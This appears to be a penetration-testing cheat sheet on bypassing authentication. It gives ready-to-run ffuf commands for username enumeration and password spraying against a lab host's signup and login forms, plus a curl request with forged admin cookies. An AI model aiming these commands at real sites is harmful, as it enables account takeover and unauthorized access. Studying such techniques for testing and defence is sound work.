---
description: Bypass logins and authentication systems
---

# Authentication Bypass

## Username Enumeration

On any signup/signin page having a username and password, we can first intercept any signup/signin requests and perform username enumeration, if we get error messages "like username already exists", or, "password for this username is wrong".

#### using ffuf

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.32.200/customers/signup -mr "username already exists"
```
{% endcode %}

### Password spray

Once we know the username we can try out password spray attacks.

{% code overflow="wrap" %}
```bash
ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.32.200/customers/login -fc 200 
```
{% endcode %}

### Cookie Tampering

{% code overflow="wrap" %}
```bash
curl -H "Cookie: logged_in=true; admin=true" http://10.10.32.200/cookie-test
```
{% endcode %}
